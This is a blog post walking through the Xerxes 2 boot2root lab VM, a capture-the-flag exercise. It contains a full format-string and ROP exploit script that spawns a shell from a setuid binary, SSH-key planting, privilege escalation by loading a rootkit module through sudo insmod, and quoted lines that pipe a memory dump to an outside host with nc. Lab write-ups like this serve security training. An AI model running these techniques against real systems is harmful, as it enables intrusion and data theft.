---
layout: post
title: "Xerxes 2 Hacking Challenge"
date: 2014-08-08 14:59:52 -0400
comments: true
categories: boot2root
---


Another month, another hacking challenge! This time it's Xerxes 2 by [barrebas](https://twitter.com/barrebas). This boot2root promised some challenges and it definitely delivered. Xerxes 1 was a lot of fun, and when Xerxes 2 was announced, I was looking forward to getting my hands dirty. As with other boot2roots, you can download a copy of Xerxes 2 at [VulnHub](http://vulnhub.com/entry/xerxes-2,97/)

<!--more-->

It occurred to me that I never wrote a writeup for Xerxes 1 after I completed it. I can't imagine why, but it's something that I'll have to do in the near future. For Xerxes 2 however, an [incentive](https://twitter.com/barrebas/status/497715061046398976) was given to complete a writeup:

> \#xerxes2 stickers arrived! Grab \#xerxes2 from http://vulnhub.com , root it, write it up & I'll send you stickers!

->![](https://pbs.twimg.com/media/Bug9NYmCYAAlUdb.jpg)<-

Stickers?! Oh yeah!

Like other medium difficulty boot2roots these days, Xerxes 2 consists of multiple challenges that need to be overcome before you are able to complete it. The goal is to read the contents of /root/flag.txt.

### Level 1: Delacroix

Using netdiscover I identifed the Xerxes 2 IP address as 172.16.229.155. A quick port scan with [onetwopunch.sh](/2012/05/31/port-scanning-one-two-punch/) revealed several open ports. 

```
root@kali ~/xerxes2
# echo 172.16.229.155 > ip.txt

root@kali ~/xerxes2
# onetwopunch.sh ip.txt tcp
[+] scanning 172.16.229.155 for tcp ports...
[+] obtaining all open TCP ports using unicornscan...
[+] unicornscan -msf 172.16.229.155:a -l udir/172.16.229.155-tcp.txt
[+] ports for nmap to scan: 22,80,111,4444,8888,57916,
[+] nmap -sV -oX ndir/172.16.229.155-tcp.xml -oG ndir/172.16.229.155-tcp.grep -p 22,80,111,4444,8888,57916, 172.16.229.155

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-08 15:53 EDT
Nmap scan report for 172.16.229.155
Host is up (0.00029s latency).
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp    open  http    lighttpd 1.4.31
111/tcp   open  rpcbind 2-4 (RPC #100000)
4444/tcp  open  krb524?
8888/tcp  open  http    Tornado httpd 2.3
57916/tcp open  status  1 (RPC #100024)
.
.
.
```

As it turned out, most of these ports were red herrings with the exception of port 8888. Running on port 8888 was actually an IPython Notebook.  

->![](/images/2014-08-08/01.png)<-

From here I identified the first user, delacroix. Nothing much to see on this page so I clicked on New Notebook which took me to another webpage where I could enter my commands if I prefixed them with an exclamation point. 

->![](/images/2014-08-08/02.png)<-

To get a proper shell, I wrote my SSH key into delacroix's .ssh/authorized_keys file and made sure the permissions were set correctly. 

->![](/images/2014-08-08/03.png)<-

Once that was set, I logged into the server as delacroix.

```
root@kali ~/xerxes2
# ssh delacroix@172.16.229.155

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____   
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb 
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM 
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM' 
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'    
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'      
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 

delacroix@xerxes2:~$ 
```

A quick look around at the system revealed two more users, polito and korenchkin. There was also a program /opt/bf that was setuid and owned by user polito, and an encrypted tarball /opt/backup/korenchkin.tar.enc

delacroix's home directory contained a C program called bf.c. After studying it for a bit, I came to the realization that this was the source code for a Brainfuck interpreter. Brainfuck is an esoteric programming language which also made a small appearance in Xerxes 1. [Wikipedia](http://en.wikipedia.org/wiki/Brainfuck) has a good explanation on how it works. 

I had a feeling /opt/bf might be exploitable so I spent a bit more time examining bf.c and found a format string vulnerability. printf() on line 78 was being called without specifying the format string:  

```c
case '#':
        // new feature 
        printf(buf);
        break;  
```

This meant I could provide my own format string and overwrite some memory address somewhere and hopefully gain control of the program. 

I use [peda](https://github.com/longld/peda) for exploit development on Linux, so I uploaded my peda directory over to delacroix's home directory and created the following .gdbinit file:

```text
source ~/peda/peda.py
set disable-randomization off
```

/proc/sys/kernel/randomize_va_space was set to 2, which meant ASLR was enabled. To make exploitation easier, I used a trick to disable the randomization of function addresses: 

```
ulimit -s unlimited
```

I loaded /opt/bf into gdb and ran checksec to see what other security measures had been compiled into the binary:

```
delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
gdb-peda$ 
```

NX was enabled which meant I couldn't execute shellcode on the stack. Having gained a better idea of what I was up against, I started analyzing the program's behavior.

I knew it had format string bug, so I sent it a  format string that would print out the contents of the stack:

```
delacroix@xerxes2:~$ python -c 'print "AAAA" + "%p."*20' | /opt/bf `python -c 'print ",>"*100'`\#
AAAA0x40185ff4.(nil).(nil).0xbfef4448.0x400139c0.0x64.0xc8.0xbfeecf10.0x40185ff4.0xbfef4448.0x80486eb.0xbfef48be.0xbfeecf10.0x7530.(nil).0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.
�����������������������������������delacroix@xerxes2:~$ 
```

The 16th item on the stack, 0x41414141, was the start of my format string. I could replace 0x41414141 with an address of a function referenced in the Global Offset Table (GOT), and then overwrite that reference to point to instructions I wanted to execute instead.

Using objdump, I looked at what functions were in the GOT: 

```
delacroix@xerxes2:~$ objdump -R /opt/bf

/opt/bf:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049a38 R_386_GLOB_DAT    __gmon_start__
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   __gmon_start__
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar
```

I decided to overwite exit's GOT reference to an instruction that would pivot me back into an area I controlled on the stack. This area would contain my ROP gadgets that would eventually setup the stack such that I could call system("/bin/sh"). 

In order to have bf read my format string from within gdb, I had to save it into a file and redirect that file into gdb's run command. 

```
printf '\x54\x9a\x04\x08\x55\x9a\x04\x08\x56\x9a\x04\x08-%%10c%%16$hn-%%10c%%17$hn-%%10c%%18$hn' > in
```

This would perform three writes into addresses 0x08049a54, 0x08049a55, and 0x08049a56, which allowed me to change it to whatever address I wanted. I tested this in gdb and confirmed that the overwrite was successful when a segmentation fault was triggered after exit() was called: 

```
gdb-peda$ r `python -c 'print ",>"*45'`# < in

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x40185ff4 --> 0x15fd7c 
ECX: 0xbfd60228 --> 0x401864e0 --> 0xfbad2a84 
EDX: 0x5b ('[')
ESI: 0x0 
EDI: 0x0 
EBP: 0xbfd677b8 --> 0xbfd67838 --> 0x0 
ESP: 0xbfd6026c --> 0x80486f7 (nop)
EIP: 0x2d2217
EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x2d2217
[------------------------------------stack-------------------------------------]
0000| 0xbfd6026c --> 0x80486f7 (nop)
0004| 0xbfd60270 --> 0x0 
0008| 0xbfd60274 --> 0xbfd60280 --> 0x8049a54 --> 0x2d2217 
0012| 0xbfd60278 --> 0x7530 ('0u')
0016| 0xbfd6027c --> 0x0 
0020| 0xbfd60280 --> 0x8049a54 --> 0x2d2217 
0024| 0xbfd60284 --> 0x8049a55 --> 0x80002d22 
0028| 0xbfd60288 --> 0x8049a56 --> 0xcd80002d 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x002d2217 in ?? ()
gdb-peda$ 
```

exit() was now jumping to 0x2d2217, an invalid address. Now I needed to pivot back into the stack to an area I controlled. A quick look at the stack at the time of the crash showed the following:

```
gdb-peda$ context stack 24
[------------------------------------stack-------------------------------------]
0000| 0xbfc3b42c --> 0x80486f7 (nop)
0004| 0xbfc3b430 --> 0x0 
0008| 0xbfc3b434 --> 0xbfc3b440 --> 0x8049a54 --> 0x302418 
0012| 0xbfc3b438 --> 0x7530 ('0u')
0016| 0xbfc3b43c --> 0x0 
0020| 0xbfc3b440 --> 0x8049a54 --> 0x302418 
0024| 0xbfc3b444 --> 0x8049a55 --> 0x80003024 
0028| 0xbfc3b448 --> 0x8049a56 --> 0xcd800030 
0032| 0xbfc3b44c ("-%11c%16$hn-%11c%17$hn-%11c%18$hn")
0036| 0xbfc3b450 ("c%16$hn-%11c%17$hn-%11c%18$hn")
0040| 0xbfc3b454 ("$hn-%11c%17$hn-%11c%18$hn")
0044| 0xbfc3b458 ("%11c%17$hn-%11c%18$hn")
0048| 0xbfc3b45c ("%17$hn-%11c%18$hn")
0052| 0xbfc3b460 ("hn-%11c%18$hn")
0056| 0xbfc3b464 ("11c%18$hn")
0060| 0xbfc3b468 ("18$hn")
0064| 0xbfc3b46c --> 0x6e ('n')
0068| 0xbfc3b470 --> 0x0 
0072| 0xbfc3b474 --> 0x0 
0076| 0xbfc3b478 --> 0x0 
0080| 0xbfc3b47c --> 0x0 
0084| 0xbfc3b480 --> 0x0 
0088| 0xbfc3b484 --> 0x0 
0092| 0xbfc3b488 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
```

The format string I input into the buffer could be found at offset 32 from the stack. That was where I needed to pivot to. Using vmmap, I identified additional libraries linked to bf that I could use for hunting gadgets:  

```
gdb-peda$ vmmap 
Start      End        Perm  Name
0x08048000 0x08049000 r-xp  /opt/bf
0x08049000 0x0804a000 rw-p  /opt/bf
0x40000000 0x4001c000 r-xp  /lib/i386-linux-gnu/ld-2.13.so
0x4001c000 0x4001d000 r--p  /lib/i386-linux-gnu/ld-2.13.so
0x4001d000 0x4001e000 rw-p  /lib/i386-linux-gnu/ld-2.13.so
0x4001e000 0x4001f000 r-xp  [vdso]
0x4001f000 0x40023000 rw-p  mapped
0x40026000 0x40183000 r-xp  /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
0x40183000 0x40184000 ---p  /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
0x40184000 0x40186000 r--p  /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
0x40186000 0x40187000 rw-p  /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
0x40187000 0x4018b000 rw-p  mapped
0xbfc23000 0xbfc44000 rw-p  [stack]
```

/lib/i386-linux-gnu/ld-2.13.so and /lib/i386-linux-gnu/i686/cmov/libc-2.13.so were linked to bf, so I downloaded those along with bf over to my machine. To find the gadgets, I used [ropeme](http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/). 

The first thing I loaded was bf and I immediately found a gadget that would remove 44 bytes from the top of the stack: 

```
root@kali ~/xerxes2
# ropshell.py 
Simple ROP interactive shell: [generate, load, search] gadgets
ROPeMe> generate bf
Generating gadgets for bf with backward depth=3
It may take few minutes depends on the depth and file size...
Processing code block 1/1
Generated 63 gadgets
Dumping asm gadgets to file: bf.ggt ...
OK
ROPeMe> search add esp %
Searching for ROP gadget:  add esp % with constraints: []
0x804867eL: add esp 0x24 ; pop ebx ; pop ebp ;;
```

I set a breakpoint at 0x080486f2 which was the call to exit() in main(). Using a bit of math, I adjusted the field widths so that exit's reference in the GOT would be overwritten to 0x804867e: 

```
printf '\x54\x9a\x04\x08\x55\x9a\x04\x08\x56\x9a\x04\x08-%%113c%%16$hn-%%263c%%17$hn-%%1661c%%18$hn' > in
```

I ran it within gdb and once the breakpoint got triggered at the call to exit(), I stepped into the function and saw that it was now about to execute the first gadget: 

```
Breakpoint 1, 0x080486f2 in main ()
gdb-peda$ si
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x40185ff4 --> 0x15fd7c 
ECX: 0xbfe1ba28 --> 0x401864e0 --> 0xfbad2a84 
EDX: 0x63 ('c')
ESI: 0x0 
EDI: 0x0 
EBP: 0xbfe22fb8 --> 0xbfe23038 --> 0x0 
ESP: 0xbfe1ba6c --> 0x80486f7 (nop)
EIP: 0x80483c0 (<exit@plt>: jmp    DWORD PTR ds:0x8049a54)
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80483b0 <__gmon_start__@plt>:  jmp    DWORD PTR ds:0x8049a50
   0x80483b6 <__gmon_start__@plt+6>:    push   0x10
   0x80483bb <__gmon_start__@plt+11>:   jmp    0x8048380
=> 0x80483c0 <exit@plt>:    jmp    DWORD PTR ds:0x8049a54
 | 0x80483c6 <exit@plt+6>:  push   0x18
 | 0x80483cb <exit@plt+11>: jmp    0x8048380
 | 0x80483d0 <__libc_start_main@plt>:   jmp    DWORD PTR ds:0x8049a58
 | 0x80483d6 <__libc_start_main@plt+6>: push   0x20
 |->   0x804867e <bf+402>:  add    esp,0x24
       0x8048681 <bf+405>:  pop    ebx
       0x8048682 <bf+406>:  pop    ebp
       0x8048683 <bf+407>:  ret
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xbfe1ba6c --> 0x80486f7 (nop)
0004| 0xbfe1ba70 --> 0x0 
0008| 0xbfe1ba74 --> 0xbfe1ba80 --> 0x8049a54 --> 0x804867e (<bf+402>:  add    esp,0x24)
0012| 0xbfe1ba78 --> 0x7530 ('0u')
0016| 0xbfe1ba7c --> 0x0 
0020| 0xbfe1ba80 --> 0x8049a54 --> 0x804867e (<bf+402>: add    esp,0x24)
0024| 0xbfe1ba84 --> 0x8049a55 --> 0x80080486 
0028| 0xbfe1ba88 --> 0x8049a56 --> 0xcd800804 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080483c0 in exit@plt ()
```

Stepping through further, I executed the add and two pop instructions and examined the stack again:

```
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x31256333 ('3c%1')
ECX: 0xbfe1ba28 --> 0x401864e0 --> 0xfbad2a84 
EDX: 0x63 ('c')
ESI: 0x0 
EDI: 0x0 
EBP: 0x6e682436 ('6$hn')
ESP: 0xbfe1ba98 ("-%263c%17$hn-%1661c%18$hn")
EIP: 0x8048683 (<bf+407>:   ret)
EFLAGS: 0x200296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804867e <bf+402>:  add    esp,0x24
   0x8048681 <bf+405>:  pop    ebx
   0x8048682 <bf+406>:  pop    ebp
=> 0x8048683 <bf+407>:  ret    
   0x8048684 <main>:    push   ebp
   0x8048685 <main+1>:  mov    ebp,esp
   0x8048687 <main+3>:  and    esp,0xfffffff0
   0x804868a <main+6>:  sub    esp,0x7540
[------------------------------------stack-------------------------------------]
0000| 0xbfe1ba98 ("-%263c%17$hn-%1661c%18$hn")
0004| 0xbfe1ba9c ("3c%17$hn-%1661c%18$hn")
0008| 0xbfe1baa0 ("7$hn-%1661c%18$hn")
0012| 0xbfe1baa4 ("-%1661c%18$hn")
0016| 0xbfe1baa8 ("61c%18$hn")
0020| 0xbfe1baac ("18$hn")
0024| 0xbfe1bab0 --> 0x6e ('n')
0028| 0xbfe1bab4 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048683 in bf ()
```
The top of the stack contained the format string I sent to bf. The ret instruction which would be executed next would pop the value at the top of the stack into EIP and execution would be redirected there. I just needed to add in my ROP payload in this area so that when ret executed, it would redirect execution to the next gadget.  

I found the majority of the gadgets I needed from libc-2.13.so. With ASLR already disabled, I looked up the addresses for system() and /bin/sh: 

```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x40062000 <system>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x40161b94 ("/bin/sh")
```

After a couple of hours, I crafted the following ROP payload that called system("/bin/sh") into a Python script: 

```python
#!/usr/bin/env python

"""
 disable ASLR using: ulimit -s unlimited

 after this, system() can be found at 0x40062000 and /bin/sh at 0x40161b94

 execute using the following to get shell: 

 (./sploit.py ; cat) | /opt/bf `python -c 'print ",>"*90'`\#
"""


buf = (

# overwrite GOT entry for exit() to point to 0x804867e. 
# this address will execute the following instructions to pivot us into 
# an area we control in the stack: add esp,0x24; pop ebx; pop ebp

# we just need to do 3 writes to overwrite the GOT entry for exit()
'\x54\x9a\x04\x08'
'\x55\x9a\x04\x08'
'\x56\x9a\x04\x08'


################### START OF ROP PAYLOAD ##################### 

# junk values removed by add esp,0x24; pop ebx; pop ebp
'XXXX'
'XXXX'
'XXXX'

'\xc1\x05\x10\x40'  # 0x401005C1: pop eax;
                    # eax needs to contain the address for /bin/sh. however 
                    # further down we have a gadget that does "adc al 0x5d"
                    # which will alter the value we pop into eax. therefore 
                    # we pop a value that will become the address of /bin/sh
                    # *after* "adc al 0x5d" is called

'\x37\x1b\x16\x40'  # 0x40161B37 popped into eax. this will turn this into 
                    # 0x40161b94 which is the real address of /bin/sh

'\x91\xa2\x10\x40'  # 0x4010A291: pop edx; pop ecx; pop ebx
                    # edx needs to contain the address for system(). however
                    # that address has a null byte, so instead of popping in 
                    # 0x40062000 we'll pop in 0x40062001 and decrement it
                    # in the next gadget

'\x01\x20\x06\x40'  # address of system()+1 popped into edx

'XXXX'              # junk for pop ecx
'XXXX'              # junk for pop ebx

'\xfa\xd4\x08\x40'  # 0x4008D4FA: dec edx ; adc al 0x5d 
                    # first instruction will decrement edx so it points to 
                    # system()
                    # second instruction will alter eax so it points to /bin/sh

'\x8c\x7e\x08\x40'  # 0x40087E8C: mov DWORD PTR [esp],eax; call edx
                    # move address of /bin/sh in eax into [esp], then 
                    # call edx which contains address of system()

################### END   OF ROP PAYLOAD ##################### 


'-%69c%16$hn'       # overwrite first byte in exit()
'-%7c%17$hn'        # overwrite second byte in exit()
'-%1917c%18$hn'     # overwrite third and fourth byte in exit()
)

print buf
```

The comments should hopefully be pretty clear on what the payload is doing. I executed the exploit and got a shell: 

```text
delacroix@xerxes2:~$ (./sploit.py ; cat) | /opt/bf `python -c 'print ",>"*90'`\#
T�U�V�XXXXXXXXXXXX�@7@��@ @XXXXXXXX�@�@-                                                                    �-      -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
id
uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
```

cat was required to keep the shell from terminating too quickly. I ran the id command which confirmed I now had EUID and EGID polito. 


### Level 2: Polito

This shell wasn't very usable, so as before, I added my SSH public key into polito's .ssh/authorized_keys file so I could SSH in and get a proper shell. Once I had logged in, I noticed three interesting files in polito's home directory:

```
polito@xerxes2:~$ ls -l
total 43932
-rw-r--r-- 1 polito polito   142564 Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito 44813850 Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito    27591 Jul 16 12:19 polito.pdf
```

audio.txt was a red herring; basically some audio file piped into port 4444 that would taunt you. dump.gpg was some kind of password protected encrypted file, and polito.pdf offered some clue regarding dump.gpg

->![](/images/2014-08-08/04.png)<-

Scanning the QR code revealed yet another taunt from Xerxes. 

I suspected that there was some hidden message inside the PDF. Fellow hacker [recrudesce](https://twitter.com/recrudesce) who was also working on the challenge and bouncing ideas off me thought that it might be a PDF hidden in the PDF. I remembered reading about something like that in a [PoC||GTFO](http://openwall.info/wiki/people/solar/pocorgtfo) issue. Unfortunately, I had to leave Xerxes 2 alone for a day after a busy work load and being exhausted overall. The following morning, recrudesce had solved this challenge and hinted that I should check the file type of polito.pdf, which I did:

```
polito@xerxes2:~$ file polito.pdf 
polito.pdf: x86 boot sector, code offset 0xe0
```

Now I definitely knew I'd seen something like this before. I poured through the PoC||GTFO issues and found the answer on the second page of issue 2:

> Ange Albertini explains the internal organization of this issue’s PDF in Section 8. Curious readers might want to run **qemu-system-i386 -fda pocorgtfo02.pdf** in order to experience all the neighbor- liness that this issue has to offer

I ran qemu-system-i386 and passed it polito.pdf as its argument and got the password for dump.gpg:

->![](/images/2014-08-08/05.png)<-

Using the password, I was able to decrypt the dump file: 

```
polito@xerxes2:~$ gpg --passphrase amFuaWNl dump.gpg 
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected
polito@xerxes2:~$ ls -l
total 172960
-rw-r--r-- 1 polito polito    142564 Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito 132120576 Aug  8 21:15 dump
-rw-r--r-- 1 polito polito  44813850 Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito     27591 Jul 16 12:19 polito.pdf
```

This was a binary file, so I examined it using strings and piped it into less. At around lines 54795-54830, I saw something interesting:

```
cat /home/korenchkin/.ssh/id_rsa
dd if=/dev/fmem of=/root/xerxesmem bs=1M count=128
dd if=/dev/fmem of=/root/xerxesmem bs=1M count=128
cd volatility-2.3.1/
cat xerxesmem |nc 172.16.32.1 5555
root@xerxes2:~/fmem_1.6-0# 
cat Debian7.zip | nc 172.16.32.1 5555
/home/korenchkin/.ssh/id_rsa
```

korenchkin's id_rsa file was being read and then the contents of /dev/fmem were being dumped into /root/xerxesmem, which was them being piped into some service running on port 5555. I suspected that service wrote the contents of xerxesmem into the dump file. 

At first I searched for references to korenchkin's id_rsa key, and I did find an RSA key in there, but it didn't work. So then I started searching for instances of korenchkin and found something more promising:

```
tar -cvf /opt/backup/korenchkin.tar ~/
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
rm /opt/backup/korenchkin.tar
```

The command and password used to encrypt korenchkin.tar was right there, so I simply reversed it to decrypt korenchkin.tar.enc

```
polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out korenchkin.tar
polito@xerxes2:~$ ls -l korenchkin.tar 
-rw-r--r-- 1 polito polito 10240 Aug  8 21:33 korenchkin.tar
```

The decryption was successful. I unpacked the tarball and extracted korenchkin's private and public SSH keys. 

```
polito@xerxes2:~$ tar xvf korenchkin.tar 
.ssh/id_rsa
.ssh/id_rsa.pub
```

I copied id_rsa over to my machine, renamed it as korenchkin_rsa, and set its permissions to read only so that SSH wouldn't complain. With that done, I logged in as korenchkin using the following command:

```
# ssh -i korenchkin_rsa korenchkin@172.16.229.155
```

### Level 3: Korenchkin

This was the last user on the system, so I assumed that from here on, the goal was to escalate to root. After a bit of poking around, I found that korenchkin had sudo rights to execute /sbin/insmod and /sbin/rmmod. 

```
korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
You have new mail in /var/mail/korenchkin
```

The first thing that came to my mind was to load up a rootkit. Since I don't deal much with rootkits, I had to Google around for a simple one and eventually settled on a sample rootkit over at [https://github.com/ivyl/rootkit](https://github.com/ivyl/rootkit). 

unzip didn't seem to be available on Xerxes 2, so I unpacked the rootkit on my machine and transferred the contents to korenchkin's home directory. From there, building it was a matter of running make:

```
korenchkin@xerxes2:~/rootkit-master$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/rootkit-master modules
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/rootkit-master/rt.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/rootkit-master/rt.mod.o
  LD [M]  /home/korenchkin/rootkit-master/rt.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'
```

This created the rt.ko module which I loaded into the system using sudo:

```
korenchkin@xerxes2:~/rootkit-master$ sudo insmod rt.ko
```

Finally, to get the root shell I issued the following command to the rootkit:

```
korenchkin@xerxes2:~/rootkit-master$ tools/rtcmd.py mypenislong /bin/bash
root@xerxes2:~/rootkit-master# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(korenchkin)
root@xerxes2:~/rootkit-master# 
```

After three days of on and off hacking away at it, I was finally able to read /root/flag.txt

```
root@xerxes2:~/rootkit-master# cat /root/flag.txt 
____   ___  ____  ___  __ ____   ___  ____     ____     ____   
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb 
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM 
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM' 
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'    
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'      
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 

	congratulations on beating xerxes2!

	I hope you enjoyed it as much as I did making xerxes2. 
	xerxes1 has been described as 'weird' and 'left-field'
	and I hope that this one fits that description too :)

	Many thanks to @TheColonial & @rasta_mouse for testing!

	Ping me on #vulnhub for thoughts and comments!

					  @barrebas, July 2014
```

Hooray!

### Final thoughts

Xerxes 2 has the right amount of balance between frustration as you try to solve a challenge, and the reward you get when you finally do solve it. I thoroughly enjoyed it and now I know more Brainfuck then I ever cared to learn. And also stickers! 







